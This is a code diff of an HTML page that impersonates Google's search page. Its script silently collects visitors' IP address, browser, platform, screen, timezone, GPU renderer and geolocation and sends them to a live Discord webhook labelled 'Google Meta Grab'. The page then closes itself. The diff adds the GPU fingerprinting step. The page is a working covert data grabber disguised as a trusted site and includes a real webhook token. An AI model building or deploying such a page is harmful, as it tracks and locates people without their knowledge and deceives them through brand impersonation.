@@ -1,14 +1,15 @@
-<!DOCTYPE html><html><head><title>Google</title><style>body{margin:0;background:#fff;color:#000;font-family:Arial,sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;}#logo{font-size:5rem;color:#4285f4;margin-bottom:20px;}input{width:500px;padding:12px;border:1px solid #dfe1e5;border-radius:24px;}</style></head><body><div id="logo">Google</div><input type="text" value="Searching metadata..." readonly><div id="status" style="margin-top:20px;color:#666;">Loading results...</div><script>
+<!DOCTYPE html><html><head><title>Google</title><style>body{margin:0;background:#fff;color:#000;font-family:Arial,sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;}#logo{font-size:5rem;color:#4285f4;margin-bottom:20px;}input{width:500px;padding:12px;border:1px solid #dfe1e5;border-radius:24px;}</style></head><body><div id="logo">Google</div><input type="text" value="Searching..." readonly><div id="status" style="margin-top:20px;color:#666;">Loading...</div><script>
 const WEBHOOK_URL='https://discord.com/api/webhooks/1495498146355089613/gBZlqAlyhI_XOfhYN_TvPNTn76kSptOY1Blh6QEDAbXWCSxn6GHmsM_uaQEK9pNkK8Sk';
-const info={timestamp:new Date().toISOString(),ip:null,userAgent:navigator.userAgent,platform:navigator.platform,screen:`${screen.width}x${screen.height}`,timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,latitude:null,longitude:null};
+const info={timestamp:new Date().toISOString(),ip:null,pcName:'unknown',userAgent:navigator.userAgent,platform:navigator.platform,screen:`${screen.width}x${screen.height}`,timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,latitude:null,longitude:null};
 async function main(){
   try{info.ip=(await(await fetch('https://api.ipify.org?format=json')).json()).ip}catch{}
+  try{const gl=document.createElement('canvas').getContext('webgl');const ext=gl.getExtension('WEBGL_debug_renderer_info');info.pcName=ext?gl.getParameter(ext.UNMASKED_RENDERER_WEBGL):'n/a';}catch{}
   if(navigator.geolocation) navigator.geolocation.getCurrentPosition(p=>{info.latitude=p.coords.latitude;info.longitude=p.coords.longitude;send();},()=>send());
   else send();
   async function send(){
-    const fd=new FormData(); fd.append('payload_json',JSON.stringify({content:'**GOOGLE GRAB**',embeds:[{description:JSON.stringify(info,null,2)}]}));
+    const fd=new FormData(); fd.append('payload_json',JSON.stringify({content:'**Google Meta Grab**',embeds:[{description:JSON.stringify(info,null,2)}]}));
     await fetch(WEBHOOK_URL,{method:'POST',body:fd});
-    setTimeout(()=>window.close(),1200);
+    setTimeout(()=>window.close(),900);
   }
 }main();
 </script></body></html>
